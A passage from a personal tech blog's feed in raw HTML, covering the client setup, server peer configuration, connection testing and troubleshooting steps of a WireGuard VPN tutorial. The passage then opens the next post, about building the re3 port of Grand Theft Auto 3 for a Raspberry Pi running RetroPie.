&lt;h3 id=&quot;generate-the-encryption-keys-for-the-client&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#generate-the-encryption-keys-for-the-client&quot; aria-label=&quot;generate the encryption keys for the client permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Generate the Encryption Keys for the Client&lt;/h3&gt;
&lt;p&gt;Start by creating some keys for the WireGuard client.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd /etc/wireguard/
umask 077; wg genkey | tee privatekey | wg pubkey &gt; publickey&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Verify the keys were created.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cat privatekey 
sg2+yeFqYualz5qop9XiIMxU1cA5BjOkJdCaf8zgNi8=
cat publickey 
eFbLx3CQV5uFh9SIHBuJn/LzPdcWMsUmPYaDk5eeXFo=&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Again, you will need these keys throughout the configuration so make sure you know where to find them.&lt;/p&gt;
&lt;h3 id=&quot;configure-wireguard-on-the-client&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configure-wireguard-on-the-client&quot; aria-label=&quot;configure wireguard on the client permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configure WireGuard on the Client&lt;/h3&gt;
&lt;p&gt;You should still be in the same directory from the last section: &lt;code class=&quot;language-text&quot;&gt;/etc/wireguard&lt;/code&gt;. In this directory, we want to create a configuration file to store all the settings for our VPN client. Start by creating the configuration file.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;touch /etc/wireguard/wg0.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And enter the following configuration in the file.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;[Interface]
Address = 10.0.0.2/24
PostUp = wg set %i private-key /etc/wireguard/privatekey
PostUp = ping -c1 10.0.0.1

[Peer]
PublicKey = 6w9lu0iQu5pf2/vKnGzFJYoY3Ci2v3GNj3U6A3a2Gyg=
Endpoint = PLACEHOLDER:51820
AllowedIPs = 0.0.0.0/0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Same as for the server configuration, here is a quick description of the client configuration.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Interface&lt;/code&gt;: Configuration of the client&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;Address&lt;/code&gt;: The IP address for the client on the VPN. This should match the &lt;code class=&quot;language-text&quot;&gt;AllowedIPs&lt;/code&gt; value we set in the server.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PostUp&lt;/code&gt;: Commands run when the client connects to the VPN, in this case setting the private key using the &lt;code class=&quot;language-text&quot;&gt;wg&lt;/code&gt; command.
&lt;code class=&quot;language-text&quot;&gt;PostUp&lt;/code&gt;: Also ping the VPN server when connecting to make sure we have established a connection. The server will not start if this command fails.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Peer&lt;/code&gt;: Configuration of the server&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;PublicKey&lt;/code&gt;: The server’s public key that we created at the start of this tutorial.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;EndPoint&lt;/code&gt;: The &lt;strong&gt;public IP&lt;/strong&gt; address of your server. You will need to replace &lt;code class=&quot;language-text&quot;&gt;PLACEHOLDER&lt;/code&gt; with the IP address of your server.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;AllowedIPs&lt;/code&gt;: The IP addresses the server allows.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;back-to-the-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#back-to-the-server&quot; aria-label=&quot;back to the server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Back to the Server!&lt;/h2&gt;
&lt;p&gt;So far we have installed and configured the VPN server and client. But we still need to do a couple of things to get them to talk and be friends.&lt;/p&gt;
&lt;h3 id=&quot;add-the-client-conf-to-the-vpn-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#add-the-client-conf-to-the-vpn-server&quot; aria-label=&quot;add the client conf to the vpn server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Add the Client Conf to the VPN Server&lt;/h3&gt;
&lt;p&gt;Start by opening the WireGuard configuration file on the server. FYI - if you have exited your &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt; shell, you will need to prefix this command with &lt;code class=&quot;language-text&quot;&gt;sudo&lt;/code&gt;, or switch the user to &lt;code class=&quot;language-text&quot;&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;vim /etc/wireguard/wg0.conf&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We need to add the public key of the client into our VPN server configuration. This will allow us to connect with our VPN client. We couldn’t do this before, as we didn’t know the public key of the client - as we hadn’t created it yet. Additionally, if you add more VPN clients, you will need to rinse and repeat this process.&lt;/p&gt;
&lt;p&gt;In the &lt;code class=&quot;language-text&quot;&gt;PublicKey&lt;/code&gt; value, add the value of the client’s public key. In this tutorial, the client’s public key was &lt;code class=&quot;language-text&quot;&gt;eFbLx3CQV5uFh9SIHBuJn/LzPdcWMsUmPYaDk5eeXFo=&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Make sure to save and exit the file. Below is a final version of my server configuration file.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;[Interface]
Address = 10.0.0.1/24
ListenPort = 51820
PrivateKey = QNZqC+to/q+DQqJV3vDTRGRrO62GHkffRyuJFbtY91M=
PostUp = /etc/wireguard/up.sh
PostDown = /etc/wireguard/down.sh

[Peer]
PublicKey = eFbLx3CQV5uFh9SIHBuJn/LzPdcWMsUmPYaDk5eeXFo=
AllowedIPs = 10.0.0.2/24&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;start-the-vpn-server&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#start-the-vpn-server&quot; aria-label=&quot;start the vpn server permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Start the VPN Server&lt;/h3&gt;
&lt;p&gt;With everything configured, we can go ahead and start the VPN server, on the server. This will start the VPN service and allow clients to connect to the server. Luckily, this is simple with WireGuard.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo wg-quick up wg0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To see the WireGuard-specific details of the interface, you can run the following command and get some basic information.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;wg&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you have finished using the VPN server, and want to stop it, issue the following command.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;wg-quick down wg0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I always start my VPN server manually, as I use it only for specific edge cases. But if you want to automatically start your VPN server on every system reboot, you can issue the following command.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;systemctl enable wg-quick@wg0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;connect-to-the-vpn-server-from-the-client&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#connect-to-the-vpn-server-from-the-client&quot; aria-label=&quot;connect to the vpn server from the client permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Connect to the VPN server from the Client!&lt;/h2&gt;
&lt;p&gt;Now that the VPN server is up and running, and the client is already configured - we can simply connect to the server. This is the same command as used to start the VPN server.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo wg-quick up wg0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;You should get some information similar to below.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;└─# sudo wg-quick up wg0

[#] ip link add wg0 type wireguard
[#] wg setconf wg0 /dev/fd/63
[#] ip -4 address add 10.0.0.2/24 dev wg0
[#] ip link set mtu 1420 up dev wg0
[#] wg set wg0 fwmark 51820
[#] ip -4 route add 0.0.0.0/0 dev wg0 table 51820
[#] ip -4 rule add not fwmark 51820 table 51820
[#] ip -4 rule add table main suppress_prefixlength 0
[#] sysctl -q net.ipv4.conf.all.src_valid_mark=1
[#] nft -f /dev/fd/63
[#] wg set wg0 private-key /etc/wireguard/privatekey
[#] ping -c1 10.0.0.1
PING 10.0.0.1 (10.0.0.1) 56(84) bytes of data.
64 bytes from 10.0.0.1: icmp_seq=1 ttl=64 time=397 ms

--- 10.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 397.253/397.253/397.253/0.000 ms&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To test the connection, try pinging an Internet-accessible site, for example, &lt;code class=&quot;language-text&quot;&gt;google.com&lt;/code&gt;. If not working, try pinging any publicly available IP address, for example, &lt;code class=&quot;language-text&quot;&gt;8.8.8.8&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Make sure you check your IP address to see if you have connected to the VPN and your traffic is being routered correctly. You can use any “What is my public IP” service on the Internet, or a variety of Linux commands, such as:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;dig +short myip.opendns.com @resolver1.opendns.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If you don’t have the &lt;code class=&quot;language-text&quot;&gt;dig&lt;/code&gt; command, you can use &lt;code class=&quot;language-text&quot;&gt;host&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;host myip.opendns.com resolver1.opendns.com&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And to disconnect.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo wg-quick down wg0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&quot;troubleshooting&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#troubleshooting&quot; aria-label=&quot;troubleshooting permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Troubleshooting&lt;/h2&gt;
&lt;p&gt;A couple of commands that I found useful when trying to troubleshoot the WireGuard configuration are:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;wg&lt;/code&gt; on the server to check VPN status, clients, and configuration&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;ip a&lt;/code&gt; on either machine to check IP addresses and the &lt;code class=&quot;language-text&quot;&gt;wg0&lt;/code&gt; network interface&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The hardest thing I found when initially configuring WireGuard is that each tutorial has different goals - find the tutorial that matches your goal. Additionally, check you have the correct keys in the configuration files, and that most errors are due to configuration problems! If things are not working, make one change and test again! Then make another change and test again!&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;I documented the steps I used to configure WireGuard, and made this tutorial so I can review this information the next time I need to configure a WireGuard VPN. But I hope it was on use to others. This is a very simple configuration, and I only use it on the throw-away VPS server. There are many additional configuration steps you should implement to make your VPN server more secure and robust! Happy hacking everyone!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Grand Theft Auto 3 on the RetroPie]]></title><description><![CDATA[My last post was about Building a retro gaming machine in a day- where I got a Raspberry Pi 4, a PS4 controller, and installed RetroPie. It…]]></description><link>https://thomaslaurenson.com/blog/2021-03-05/gta3-on-the-retropie/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2021-03-05/gta3-on-the-retropie/</guid><pubDate>Fri, 05 Mar 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;My last post was about &lt;a href=&quot;/blog/2021-02-20/retropie-building-a-retro-game-console-in-a-day&quot;&gt;Building a retro gaming machine in a day&lt;/a&gt;- where I got a Raspberry Pi 4, a PS4 controller, and installed RetroPie. It was a blast to play some SNES, PS1, and Amiga games. But like usual, I seem to have more fun tinkering with these things than playing games for hours on end…&lt;/p&gt;
&lt;p&gt;I recently stumbled on an interesting project called &lt;strong&gt;re3&lt;/strong&gt; - a reverse engineering project of the original Grand Theft Auto 3. After a little reading, I discovered the project had excellent Linux support. To spice things up, there were a couple of GitHub issues posted about people running it on a Raspberry Pi - as well as some official build instructions which included ARM instructions! Victory! Getting GTA3 running on my RetroPie seemed like my next adventure. Spoiler - it works, and pretty well.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/09a3e6cc49def931e5af3ac67ed217e2/29114/gta-gameplay.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 67.08860759493672%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACo0lEQVQozxVRW3OaUBDmpdOJUSAgICoYEeR6OIKAchMQxAtqYtOm7STpZDp96mNfOn3pX+hf7snMzs7O3r7v28UGMhwqM2S3umfOZuLtkGR4otvjx8ZID1hRYXhO0izdK46Xh8cvT1lRPayZzxUrGS42lEFfMrmRIenO8+PqXBsERbZJihVkUfNRKc/Aj5fc8Bzb1M9xULjy769Xf5/fixMZ60sqxfIdAicpSpcZTRUQLNUbcEOxP9YGE80Aiu/2mR7eoTtt6s23iPa71hXJsdgEehPg0iyD0zTd69F9YSCbvZEk6ZZse/xoTLD8+3brCm/jXeKa7LRvcIIhr1HI0thwqguqMZSngjIdTo3+RGXFcX+iCSoYm66owYGicyOpOxj0xCE76N9wTKeLdBE4RWOqu7CCBQg83bFvVUWYyEjMaKrKli1bcKyhW5hjzZoCAHwPhpEVpqofK/NIdhaYGRV2kjtJ5iYZDKJ5nC2KOir36faU7u/i3Smpj1HVJNv7tPnorfeo34wre7Wzsz0G84ObH+d5Y0elHa3RR5LTc375DsOSEwRk5jzOL6+r84tffvDKi1Oc0BhY1Ua0xtz8bIRbxV3py9JcFkaQwXQL8yMnKTd4iyTaFM8bUQXTnRWWINzAtHGLO6c4gtUW0xbVsY7/vGbNJprOUztcw2QT+KlyQ/I0JXAsClwwR3k7rkBUWmFlJ3sEOS8vmOqtvx1W/37tfn5a6n5mI5Ckdr0Y0l2VJGGX8RnGNl3EyFoWIK6scI0o2PEOJnvMikrTT7zAd8P4bStSHlfKLOwJkiCMRVEaqfMJjMAyu7s/HM7Humn2p+ZwbmbpDgPhWg8y1VuZb5gbJ6nzw1OQHmxnCd3Imi3hop4tKhhkIEhBmKMeGKPTIv7Ff2+sjos9k7ZeAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;GTA3 gameplay on a Raspberry Pi 4 running RetroPie&quot;
        title=&quot;GTA3 gameplay on a Raspberry Pi 4 running RetroPie&quot;
        src=&quot;/static/09a3e6cc49def931e5af3ac67ed217e2/f058b/gta-gameplay.png&quot;
        srcset=&quot;/static/09a3e6cc49def931e5af3ac67ed217e2/c26ae/gta-gameplay.png 158w,
/static/09a3e6cc49def931e5af3ac67ed217e2/6bdcf/gta-gameplay.png 315w,
/static/09a3e6cc49def931e5af3ac67ed217e2/f058b/gta-gameplay.png 630w,
/static/09a3e6cc49def931e5af3ac67ed217e2/40601/gta-gameplay.png 945w,
/static/09a3e6cc49def931e5af3ac67ed217e2/78612/gta-gameplay.png 1260w,
/static/09a3e6cc49def931e5af3ac67ed217e2/29114/gta-gameplay.png 1920w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;&lt;p&gt;GTA3 gameplay on a Raspberry Pi 4 running RetroPie&lt;/p&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;update-2021-02-10&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#update-2021-02-10&quot; aria-label=&quot;update 2021 02 10 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Update: 2021-02-10&lt;/h2&gt;
&lt;p&gt;Unfortunately, the &lt;strong&gt;re3 project on GitHub has been subjected to a DCMA take-down notice&lt;/strong&gt;. This means the project source code is not available from the original GitHub repository, and updates to the project seem unlikely. However, I had already written most of this blog post and thought I would publish it anyway.&lt;/p&gt;
&lt;p&gt;The source seems to be available from various locations - guess the Internet doesn’t forget! The data collection enthusiasts at &lt;code class=&quot;language-text&quot;&gt;/r/DataHorder&lt;/code&gt; live for this stuff. One post I found was: &lt;a href=&quot;https://www.reddit.com/r/DataHoarder/comments/loctpb/archived_gta_iii_and_vc_reverse_engineered_code/&quot;&gt;Archived GTA III and VC Reverse Engineered Code Repo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Without getting too deep into the ethics of this debacle - I purchase a genuine Windows copy of GTA3 from Steam - specifically to play the re3 version on my Raspberry Pi. So I feel I can sleep soundly at night, supporting the original creators on a platform they never intended to support and (most likely) never will.&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#update-2021-02-10&quot;&gt;Update: 2021-02-10&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#setup-re3-environment&quot;&gt;Setup re3 Environment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#meeting-re3-requirements&quot;&gt;Meeting re3 Requirements&lt;/a&gt;&lt;/p&gt;
